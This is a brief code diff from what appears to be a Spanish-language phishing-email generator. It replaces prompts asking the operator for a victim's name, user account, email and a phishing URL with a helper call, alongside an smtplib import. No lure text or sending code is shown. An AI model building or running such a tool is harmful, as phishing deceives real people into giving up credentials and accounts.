@@ -2,15 +2,11 @@ import time
 import os
 import sys
 import smtplib
-from helper.helper import getPath
+from helper.helper import getPath, get_input_es
 
 def building_selling_es():
     
-    #Información de la victima
-    userName = input("Introduce el nombre de tu victima-->")
-    userAccount = input("Introduce la cuenta de usuario de tu victima-->")
-    url=input("Introduce el url de phishing-->")
-    userEmail=input("Introduce el email de la victima-->")
+    get_input_es()
     
     date=time.localtime()
     currentDate=time.strftime("%D %B %Y, %H:%M:%S",date)
